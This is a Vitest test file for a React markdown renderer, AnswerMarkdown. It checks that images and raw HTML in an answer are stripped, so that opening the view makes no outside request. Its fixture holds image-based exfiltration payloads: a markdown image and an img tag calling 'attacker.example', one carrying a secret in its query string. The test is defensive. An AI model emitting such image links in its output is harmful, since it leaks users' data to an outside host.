import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { AnswerMarkdown } from './reader-markdown.tsx';

describe('AnswerMarkdown', () => {
  it('답에 든 이미지와 HTML은 그리지 않아, 화면을 열기만 해도 바깥으로 요청이 나가는 일이 없다 (ADR-0015)', () => {
    const markdown = ['요약입니다.', '![x](https://attacker.example/?q=secret)', '<img src="https://attacker.example/raw">', '[링크](https://example.com)'].join('\n\n');
    const html = renderToStaticMarkup(createElement(AnswerMarkdown, { markdown }));
    expect(html).not.toContain('attacker.example');
    expect(html).not.toContain('<img');
    expect(html).toContain('<a href="https://example.com" target="_blank" rel="noopener noreferrer">링크</a>');
  });
});
